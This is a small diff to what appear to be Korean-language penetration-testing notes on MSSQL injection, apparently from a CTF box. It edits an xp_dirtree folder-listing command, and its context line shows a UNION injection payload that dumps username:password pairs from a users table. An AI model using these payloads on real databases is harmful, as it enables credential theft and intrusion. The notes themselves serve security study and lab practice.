@@ -280,7 +280,7 @@ SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
 ### xp_dirtree
 ```mssql
 -- 내부 폴더 탐색 가능.
-EXEC xp_dirtree C:\;
+EXEC xp_dirtree "C:\";
 ```
 
 
